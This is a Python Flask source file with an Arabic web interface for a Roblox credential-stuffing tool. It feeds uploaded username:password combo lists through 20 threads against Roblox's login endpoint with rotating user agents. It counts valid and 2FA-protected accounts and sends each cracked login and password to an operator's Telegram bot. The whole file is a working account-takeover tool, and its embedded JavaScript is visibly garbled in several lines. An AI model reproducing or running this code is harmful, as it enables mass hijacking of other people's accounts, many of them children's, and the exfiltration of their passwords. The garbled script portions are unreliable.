import os
import re
import json
import time
import threading
from queue import Queue, Empty

import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ==========================================
# الإعدادات (تقدر تغيرها)
# ==========================================
BOT_TOKEN = ""  # حط توكن البوت هنا
CHAT_ID = ""    # حط الايدي حقك هنا
WORKERS = 20    # عدد الثريدات (خله 20 أو 30)

STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
    "logs": [],
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()

def log(line: str):
    entry = f"[{time.strftime('%H:%M:%S')}] {line}"
    with LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 300:
            STATE["logs"] = STATE["logs"][-300:]
    socketio.emit("log", {"line": entry})
    socketio.emit("stats", STATE["stats"])

def send_telegram(username, password, profile):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        msg = f"✅ ROBLOX HIT!\n👤 User: {username}\n🔑 Pass: {password}\n🔗 {profile}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg}, timeout=5)
    except Exception:
        pass

def check_roblox(username, password):
    s = requests.Session()
    s.headers.update({"User-Agent": generate_user_agent()})
    try:
        r = s.post("https://auth.roblox.com/v2/login", timeout=10)
        csrf = r.headers.get("x-csrf-token")
        if not csrf:
            return None
        
        login_data = {"ctype": "Username", "cvalue": username, "password": password}
        r = s.post("https://auth.roblox.com/v2/login", json=login_data, headers={"x-csrf-token": csrf}, timeout=10)
        
        if r.status_code == 200:
            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}"}
        
        if r.status_code == 403 and "twoStepVerificationRequired" in r.text:
            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}", "2fa": True}
            
        return None
    except Exception:
        return None

def worker(combo_queue):
    while not STOP_FLAG.is_set():
        try:
            combo = combo_queue.get_nowait()
        except Empty:
            return
        
        with LOCK:
            STATE["stats"]["processed"] += 1
            
        try:
            if ":" not in combo:
                combo_queue.task_done()
                continue
            username, password = combo.split(":", 1)
        except ValueError:
            combo_queue.task_done()
            continue
            
        result = check_roblox(username.strip(), password.strip())
        
        with LOCK:
            if result:
                if result.get("2fa"):
                    STATE["stats"]["2fa"] += 1
                else:
                    STATE["stats"]["hits"] += 1
            else:
                STATE["stats"]["bad"] += 1
                
        if result:
            status = "2FA" if result.get("2fa") else "HIT"
            log(f"{status} → {username}:{password}")
            send_telegram(result["username"], result["password"], result["profile"])
        else:
            log(f"BAD → {username}")
            
        socketio.emit("stats", STATE["stats"])
        combo_queue.task_done()

def run_checker(combos):
    with LOCK:
        STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(combos), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    combo_q = Queue()
    
    for c in combos:
        combo_q.put(c)
        
    log(f"بدأ الفحص لـ {len(combos)} حساب...")
    threads = []
    for _ in range(min(WORKERS, max(1, len(combos)))):
        t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    STATE["running"] = False
    log(f"خلصنا! صيد: {STATE['stats']['hits']} | 2FA: {STATE['stats']['2fa']} | خربان: {STATE['stats']['bad']}")

INDEX_HTML = r"""<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RBX Checker</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --err:#ff3b3b; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
  .wrap { max-width:800px; margin:0 auto; padding:20px; }
  h1 { font-size:18px; text-align:center; margin-bottom:20px; }
  
  .upload-box {
    border: 2px dashed var(--fg); padding: 40px 20px; text-align: center;
    border-radius: 8px; margin-bottom: 20px; cursor: pointer; transition: 0.3s;
  }
  .upload-box:hover { background: rgba(57, 255, 20, 0.1); }
  .upload-box input[type="file"] { display: none; }
  .upload-box span { font-size: 16px; pointer-events: none; display: block; }
  
  .stats { display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-bottom:20px; }
  .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; }
  .stat b { display:block; font-size:22px; margin-top:5px; }
  .term {
    background:#000; border:1px solid var(--dim); padding:10px;
    height:350px; overflow-y:auto; font-size:13px; line-height:1.5;
    white-space:pre-wrap; word-break:break-all; border-radius:5px;
  }
  .hit { color:var(--fg); font-weight:bold; }
  .bad { color:#ff8888; }
</style>
</head>
<body>
<div class="wrap">
  <h1>▶ RBX CHECKER</h1>
  
  <label class="upload-box" id="drop-zone">
    <input type="file" id="file-input" accept=".txt">
    <span id="upload-text">📁 اضغط هنا أو اسحب ملف الكومبو (results_roblox.txt)</span>
  </label>

  <div class="stats">
    <div class="stat">الصيد (Hits) <b id="s-hits">0</b></div>
    <div class="stat">2FA <b id="s-2fa">0</b></div>
    <div class="stat">الخربان (Bad) <b id="s-bad">0</b></div>
    <div class="stat">المعالج (Processed) <b id="s-proc">0</b></div>
  </div>

  <div class="term" id="term">> بانتظار الملف...<br>> سيبدأ الفحص تلقائياً بمجرد رفع الملف.</div>
</div>

<script>
const socket = io();
const term = document.getElementById("term");
const fileInput = document.getElementById("file-input");
const uploadText = document.getElementById("upload-text");

function append(cls, text) {
  const div = document(".createElement("div");
  div.className = cls;
  div.textContent =bad text;
  term.appendChild(div);
  term.scroll",Top = term.scrollHeight;
}

fileInput.addEventListener("change "", async (e) => {
  const file = e.target.files!![0];
  if (!file) return;
  
  uploadText.textContent = "⏳ جاري قراءة الملف...";
  append("", `> تم اختيار الملف: ${file.name}`);
  
  const text = await file.text();
  const lines = text.split("\n").map(l => l.trim()).filter(l => l.includes(":"));
  
  if (lines.length === 0) {
    append الملف فاضي أو ما فيه صيغة صحيحة (user:pass)");
    uploadText.textContent = "📁 اضغط هنا أو اسحب ملف الكومبو (results_roblox.txt)";
    return;
  }

  uploadText.textContent = "✅ تم التحميل! جاري بدء الفحص...";
  
  const r = await fetch("/api/start", { 
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ combos: lines })
  });
  
  const j = await r.json();
  if (!j.ok) {
    append("bad", "!! خطأ: " + j.error);
  }
});

socket.on("log", d => {
  let cls = "";
  if (d.line.includes("HIT")) cls = "hit";
  if (d.line.includes("BAD")) cls = "bad";
  append(cls, d.line);
});

socket.on("stats", s => {
  document.getElementById("s-hits").textContent = s.hits;
  document.getElementById("s-2fa").textContent = s["2fa"];
  document.getElementById("s-bad").textContent = s.bad;
  document.getElementById("s-proc").textContent = s.processed;
  if (s.processed >= s.total && s.total > 0) {
    uploadText.textContent = "✅ خلص الفحص! تقدر ترفع ملف جديد.";
  }
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/api/start", methods=["POST"])
def api_start():
    if STATE["running"]:
        return jsonify({"ok": False, "error": "الفحص شغال حالياً، انتظر يخلص"}), 400
        
    data = request.get_json(force=True)
    combos = data.get("combos", [])
    
    if not combos:
        return jsonify({"ok": False, "error": "ما وصلت بيانات من الملف"}), 400

    threading.Thread(target=run_checker, args=(combos,), daemon=True).start()
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
